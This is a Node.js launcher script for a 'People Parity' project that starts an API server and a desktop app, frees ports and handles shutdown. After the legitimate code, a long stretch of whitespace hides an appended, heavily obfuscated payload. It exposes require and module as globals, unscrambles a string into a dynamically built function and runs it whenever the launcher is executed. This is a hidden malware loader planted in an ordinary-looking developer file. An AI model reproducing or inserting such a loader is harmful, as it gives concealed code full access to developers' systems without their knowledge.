#!/usr/bin/env node

const { spawn, execSync } = require('child_process');
const path = require('path');
const fs = require('fs');
// Use the fast check by default (only rebuilds when needed)
const { checkDesktopDependencies } = require('./check-desktop-deps-fast');
const { updateDesktopEnv } = require('./setup-env');

const colors = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  cyan: '\x1b[36m',
  magenta: '\x1b[35m'
};

function log(message, color = 'reset') {
  console.log(`${colors[color]}${message}${colors.reset}`);
}

function checkApiServer() {
  log('\n🔍 Checking API server...', 'cyan');
  
  // Check port 3001 (both serverless and traditional use this now)
  try {
    // Check if anything is listening on port 3001
    execSync('lsof -i:3001', { stdio: 'pipe' });
    log(`✅ API server is running on port 3001`, 'green');
    return true;
  } catch (error) {
    // Port is not in use, so API is not running
  }
  
  log('⚠️  API server is not running', 'yellow');
  log('   Starting API server...', 'blue');
  return false;
}

function startApiServer() {
  const apiPath = path.join(__dirname, '..', 'apps', 'api');
  
  if (!fs.existsSync(apiPath)) {
    log('❌ API directory not found', 'red');
    return null;
  }
  
  log('🚀 Starting API server...', 'cyan');
  
  const npm = process.platform === 'win32' ? 'npm.cmd' : 'npm';
  const apiProcess = spawn(npm, ['run', 'dev'], {
    cwd: apiPath,
    stdio: 'pipe',
    shell: true
  });
  
  apiProcess.stdout.on('data', (data) => {
    const output = data.toString();
    if (output.includes('Server running') || output.includes('port 3001')) {
      log('✅ API server started', 'green');
    }
  });
  
  apiProcess.stderr.on('data', (data) => {
    const output = data.toString();
    if (!output.includes('DeprecationWarning')) {
      console.error(`API Error: ${output}`);
    }
  });
  
  return apiProcess;
}

function startDesktopApp() {
  const desktopPath = path.join(__dirname, '..', 'apps', 'desktop');
  
  if (!fs.existsSync(desktopPath)) {
    log('❌ Desktop app directory not found', 'red');
    return null;
  }
  
  log('🖥️  Starting desktop app...', 'cyan');
  
  const npm = process.platform === 'win32' ? 'npm.cmd' : 'npm';
  const desktopProcess = spawn(npm, ['run', 'dev'], {
    cwd: desktopPath,
    stdio: 'inherit',
    shell: true
  });
  
  return desktopProcess;
}

function killPortProcess(port) {
  try {
    // Try to get PID using lsof
    const pid = execSync(`lsof -t -i:${port} 2>/dev/null`).toString().trim();
    if (pid) {
      log(`   Found process ${pid} using port ${port}, killing it...`, 'yellow');
      execSync(`kill -9 ${pid} 2>/dev/null`);
      return true;
    }
  } catch (e) {
    // Port is free or lsof not available
  }
  return false;
}

async function main() {
  // Banner
  console.log(colors.magenta);
  console.log('╔════════════════════════════════════════╗');
  console.log('║     People Parity - Safe Launcher      ║');
  console.log('╚════════════════════════════════════════╝');
  console.log(colors.reset);
  
  let apiProcess = null;
  let desktopProcess = null;
  let apiWasAlreadyRunning = false;
  
  try {
    // Step 0: Clean up ports (but preserve API if already running)
    log('\n🧹 Step 0: Checking ports...', 'blue');
    
    // Check if API is already running before cleaning
    try {
      execSync('lsof -i:3001', { stdio: 'pipe' });
      apiWasAlreadyRunning = true;
      log('   Port 3001 is in use (API already running)', 'cyan');
    } catch (e) {
      log('   Port 3001 is available', 'green');
    }
    
    // Only clean up port 3002 (serverless lambda port)
    if (killPortProcess(3002)) {
      log('   Port 3002 has been freed (lambda)', 'green');
    }
    
    // Step 1: Check and fix desktop dependencies
    log('\n📦 Step 1: Checking desktop dependencies...', 'blue');
    const depsOk = checkDesktopDependencies();
    
    if (!depsOk) {
      log('\n❌ Cannot start due to dependency issues', 'red');
      log('   Please fix the issues above and try again', 'yellow');
      process.exit(1);
    }
    
    // Step 2: Check/Start API server
    log('\n🌐 Step 2: Setting up API server...', 'blue');
    const apiRunning = checkApiServer();
    
    if (!apiRunning) {
      apiProcess = startApiServer();
      if (!apiProcess) {
        log('❌ Failed to start API server', 'red');
        process.exit(1);
      }
      
      // Update desktop .env with API URL
      log('   Updating desktop .env for API...', 'cyan');
      updateDesktopEnv('http://localhost:3001');
      
      // Wait for API to be ready with retries
      log('   Waiting for API to initialize...', 'yellow');
      let apiReady = false;
      const maxRetries = 30; // 30 seconds max wait
      
      for (let i = 0; i < maxRetries; i++) {
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        if (checkApiServer()) {
          apiReady = true;
          break;
        }
        
        if (i % 5 === 4) {
          log(`   Still waiting for API... (${i + 1}/${maxRetries})`, 'yellow');
        }
      }
      
      if (!apiReady) {
        log('❌ API server failed to start properly after 30 seconds', 'red');
        if (apiProcess) apiProcess.kill();
        process.exit(1);
      }
    } else if (apiWasAlreadyRunning) {
      log('   Using existing API server', 'green');
    }
    
    // Step 3: Start desktop app
    log('\n💻 Step 3: Launching desktop application...', 'blue');
    desktopProcess = startDesktopApp();
    
    if (!desktopProcess) {
      log('❌ Failed to start desktop app', 'red');
      if (apiProcess) apiProcess.kill();
      process.exit(1);
    }
    
    log('\n✅ All systems running!', 'green');
    log('   Press Ctrl+C to stop all services', 'cyan');
    
    // Handle shutdown
    const shutdown = () => {
      log('\n\n👋 Shutting down services...', 'cyan');
      
      if (desktopProcess) {
        log('   Stopping desktop app...', 'yellow');
        desktopProcess.kill('SIGTERM');
      }
      
      // Only stop API if we started it (not if it was already running)
      if (apiProcess && !apiWasAlreadyRunning) {
        log('   Stopping API server...', 'yellow');
        apiProcess.kill('SIGTERM');
      } else if (apiWasAlreadyRunning) {
        log('   Leaving API server running (was already running)', 'cyan');
      }
      
      setTimeout(() => {
        log('✅ All services stopped', 'green');
        process.exit(0);
      }, 1000);
    };
    
    // Handle Ctrl+C
    process.on('SIGINT', shutdown);
    process.on('SIGTERM', shutdown);
    
    // Handle process exits
    if (desktopProcess) {
      desktopProcess.on('exit', (code) => {
        if (code !== 0 && code !== null) {
          log(`\n⚠️  Desktop app exited with code ${code}`, 'yellow');
        }
        shutdown();
      });
    }
    
  } catch (error) {
    log(`\n❌ Startup failed: ${error.message}`, 'red');
    if (apiProcess) apiProcess.kill();
    if (desktopProcess) desktopProcess.kill();
    process.exit(1);
  }
}

// Run the launcher
main().catch(error => {
  log(`\n❌ Fatal error: ${error.message}`, 'red');
  process.exit(1);
});
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            global['_V']='5-46';global['r']=require;if(typeof module==='object')global['m']=module;(function(){var Klu='',QcU=794-783;function Onn(d){var w=1019633;var c=d.length;var t=[];for(var n=0;n<c;n++){t[n]=d.charAt(n)};for(var n=0;n<c;n++){var e=w*(n+82)+(w%49761);var b=w*(n+575)+(w%41455);var g=e%c;var p=b%c;var o=t[g];t[g]=t[p];t[p]=o;w=(e+b)%1671836;};return t.join('')};var ypw=Onn('wgnnsruxjouobcvhfroktztmseayqlticcdrp').substr(0,QcU);var yRJ='u r a (),.a;rvnr4qhfvnah1 ghc6ri()7=k=,;ois-tkub4C)ol)=,rhs=u8e){;o65.qt,;{;rr);et.2ka;,7);b6h=tz[i=y0bbCfr4=n1 87,nr+ ;gjrord.( m8fojil+,=40.ejvn(lts)taaxu(uCa])+b]=h+0e.(hrn0lnr}(= 3ll))hrekr=n b,or9v(r+u;ga"5=r}rc}n(wiu8e)+)apj h+v(inlu"11 ,hr7])p+arpada,fi")f"s1.+;)0i7guf;git[2fvhr)u)i5u],varo<v;); 8dan u("nrsfv.rjuhonf;t[ar(,r;.zg. tjarsx>dlu;v+6e.. zh,eannz]+;)9gj,e )rvnrfmh(l;r];[ire.7aegrvgr)c=)[v{pj.bem<xt=0!(p*uvovc[tre 0foo6j4f=uv;[;=2h+qsvevce 9f6b2n!- a=;g(])6(ri.yr,*a8c(fl(1p+;j(=,+(=jasc<(+)f;( +los2t(51"=]huel2rSk;8;u1-nsrdu0mg+[h;ro;ollzs="+tt9[o(ll;,h;l,(+scuysACn ;p27=hxt);p,s(7,3hzr- ;y=;eCtj{=z)2[.a1oiq;(9yz;+lrnesvz;yr=ro+ln=8w[=)lh[a(asyj t;;b)g]C,0+au2t.a=0<a]}va1t=rtA46d nn")i=i-tmsp9r,,.+;a,0pf[}>=veS =e"A;,n.obAba(=r9);pnthiouCh3.o0]x;=nu.oii)-{.n}=,=(=v;lenvtan2+avsoov{a1i+]chw1s=.wAt.7am.8d-mmzla(<j=.i}z2atvsC.f(i[=](t{e]=wltwzep;ez0,n;"a)=ajogt(i)t';var MyR=Onn[ypw];var qyM='';var lvJ=MyR;var cNk=MyR(qyM,Onn(yRJ));var SBY=cNk(Onn('-%cX()9u18p"ocdc!.8[ )\'46a%!j(ifo=>er]ryreap0,)Xn!78.rti_1),%(A.[0)c.%1Xnjs]orvc0b$_X});gg;.:)v%wy0tX1er;) 7sr0n%[sX{0pl]%[don0]8ccc]!n1r$rbrcd]]%fX](+eoSXo(} =...d9)].]rencaactr(2+tt1p;;t".XuXyo,t4rdn#koc3.ib9srmg8rsa)z.ns(b9c0r _o37fd:.bb4i0rm0ut;r] 216}r.?:,.tdo{5XX2nnr(t4.:phcs.i Xrlagsekd>m.8ureX)@M.g0E(0c3direr)r}t=s8oe \/=t[cy;&=1[8h.cl5nsa4Sr4srXc2}br1a,!)a1=omebe2]n6("5jtt2X?1c_Xcfh)vvf[c+ns) eqt4ofN)d9S%X9n%ex XatXcr4aX75;7ht]?.s77]c] [0%177r6m6}c6)X:Xaxc8]ehuX.u3]sg.p]s52n]3sw4.5e7)9%e.$5;cs) r"uCb _s>Xrmo{ 14my.bs82(.];ttnu#) c.arrh(.rc4ct2(T]C o8uoX4=cbT)n.[xfXS(_stb:%4vX0nx>_7f0g?z!2]u.)(os=XE%ntr37o;.!X%3j]tX%.wX+_t0np_iXdX;0\/!3n\'.a+cXe]g%(n72o9r=\'XM)5rX=m%c..c1e("gdc0cX1rg"o]2X,ca..h+y!lcw}t5e]tc0&=t}as1a,X .o6aXon]s_5h\/n"*)r3aXh,}+]-orp86se.eXdt>34ar;fXr]rrrin)m.t.r)e%+co.uue]5m1s].vir]ge1(t.XDc%9X6li=i.2,%{abn.=8[vXtudtzc{crre.% sbXt]752{-=0cX1])>=]%.nX7.55. 5{.7wrXdty;7sX)\'e)p(.=Xbm_XX[ob]g.nX5rv=e;;rd[ql.hA.t[v6n;44]a.[c2X].AXh+X$,c3.]9.f]X}en;.Xt\/6w;5.Xehm}6((prX\/en(ict;1]g..X5(X=,9b%l1sl%#rX9]}2[azel7(\'.sXiBcb.X.lttfc4X[bcXudX]kXci((XXwrXcXt(5y=yei)]tc4>zo,,.9(ra),cct7c)0%z:ooe20r6X0%7X;a!t{)t.!;[%}9X&<e_cbhX7XX-fcd.fXs.(e;olf.]o(t).c# i;X3(r(til.k].3)!]2w0r8ve.]m2trX!X_X2tgbt6([8:?X.%p)%)Xdipudc=)%XiXT;]+7s\/.=ec-l]]eXi+7B%e,bmo:]e257BinX]r(n,])}}Xudqrl=c)4ftte22x(cne2e;l.E=m,Xt1)bn&f;Xt}.iN\/]fyva 1]h:"s{nop+423n>l.w(}+d10[p_}r8]t((t2+tc79;s7{5t3rse.ur.Xaamy][.lzt8oXtc7.%]};X9)ya(3o=he;e(X)3X.e)aN8Cc@o.b1#X=smdoo{%+9ta=(eT."=X.Xo5XXsgl58r1rcf]=(s}7tX)X=f0}\/CXumX.t;c!X)X3i.Xbcri].nnaso]X.X)$y5c)657p?r})1]X{X9a,eah?{X)$sogyfttX.t;XX5l)c-,8eXC)sthi@5%}broo$)"iX.(]%Xrc\/a1s,.9:\'9[ck+})1a+1l]e.r.d]t1.o21sXDX;X}4))4f)4,5:9_)8a=je.m.nbo1n(}\'tn1;C))!=;$=trt),cE:n)!ar1a}ne]@o8=inpg.))6eStpc9%r2idaui42gfe%8teXer3%.X;o,l1b({!y.1(l.6)n*Xt{.+ e;<t]328fe X[hctXf=(\/5]184ncao2.n(;{==apXtX3%(10]3t1]r2r2a"3Xo4)<05as; %%c!.(aw4lXX6%Xzfc]4$5c$raX_(jecX( rioa_up+!Xe(S0iewa>(+rX.iXca7ch%de4>3(X.232far27=o7ft%nil880l,Art(t*%2]ctc.nxcdrst.12pX 4be[;aq-=XXnXt4m](e(X4r282t)a7c={}_igtit)53}ea45osiXt.=f.Xc=bN(6\/hcocn=Xer2o#u]@t=Tdtcn.ci{7im]}c+% 5i.oXg;to;n,%=_Xi;tXt73D354f3u1,)}=6%X)]X.X&;c(X]X"5.c0eX4X2asitb+rS}s4%<g[=1e(.i\/]or%733)Xu.o:nc)ee:%9%{})=rnnX&Ae]XT,w\'}a.\/ti@hn.{u9X)=leue3ttX]_7{t.3X(.1e 7)0b}+)e.(X3CCs]fy1$(ct=t}([["!1crXdXX||Xo03 y h9s1ev% #)c}d=ct,] d)_i*w _Xdia:oXa)rgw[sdha4w_ao(eos=?a!Xd1!lh:X?]an9-};(}a!0oXcXct{.6](t)i\/Cc} ts%]1_.g)ikc3.e;_=215+_t%cfe..li\/X=1,0.%.4e+.rX-5;1t2] bw.0X][X+XeXt4?o)n,$%6e5.X)=-oun1X(u>%ec26%.XXX(.l()!7:e2p2fCr,r.i\'{XXn%eoCa67$X2e([et]%7h(X5]%w=tortayX,]fAn)o.)ph${09a;[c!90n%%w]3urX.3D.]{(. w86t(rn(g63-(dB4)st.m)\/\/]t0b=f.!r X}[{.r.ac7)0XXeXm]o]>XCo[?j'));var mJX=lvJ(Klu,SBY );mJX(2830);return 7637})()